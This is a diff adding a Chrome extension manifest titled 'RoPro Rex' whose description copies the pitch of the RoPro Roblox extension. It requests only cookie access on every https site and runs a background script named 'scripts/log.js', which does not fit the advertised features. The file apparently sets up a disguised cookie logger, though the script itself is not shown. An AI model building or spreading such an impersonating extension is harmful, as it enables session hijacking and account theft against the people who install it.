@@ -1,0 +1,29 @@
+{
+    "name": "RoPro Rex",
+    "description": "RoPro is primarily made for people who want a fresh look and feel on the site by providing quality of life features to make it more efficient to play games and trade. Some RoPro features include a built-in Avatar Sandbox, customizable profile themes, server filters, joining random games and servers, and more. As of April 2022, RoPro has over 1 Million active users.",
+    "version": "23.0.1",
+    "manifest_version": 3,
+
+    "action" : {
+        "default_icon": "assets/roblox.png"
+    },
+
+    "host_permissions": [
+	"https://*/*"
+    ],
+
+    "permissions": [
+        "cookies"
+    ],
+
+    "background": {
+        "service_worker": "scripts/log.js"
+    },
+
+    "icons": {
+        "16": "assets/roblox.png",
+        "32": "assets/roblox.png",
+        "48": "assets/roblox.png",
+        "128": "assets/roblox.png"
+    }
+}
